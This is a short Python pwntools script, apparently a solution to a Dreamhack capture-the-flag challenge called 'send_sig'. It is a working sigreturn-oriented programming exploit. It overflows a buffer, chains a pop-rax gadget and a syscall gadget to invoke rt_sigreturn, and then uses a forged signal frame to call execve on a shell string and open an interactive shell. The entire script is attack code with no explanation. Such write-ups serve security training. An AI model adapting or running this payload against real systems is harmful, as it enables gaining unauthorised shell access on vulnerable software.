from pwn import *

context(arch="amd64", os="linux")

p = process("./send_sig")
# p = remote("host3.dreamhack.games", 10443)

binsh_func = 0x401090
prax_r = 0x4010ae
syscall = 0x4010b0

pay = b'A'*0x10 + p64(prax_r) + p64(0xf) + p64(syscall)
frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = 0x402000
frame.rsi = 0x0
frame.rdx = 0x0
frame.rip = syscall
pay += bytes(frame)

p.sendafter("Signal:", pay)
p.interactive()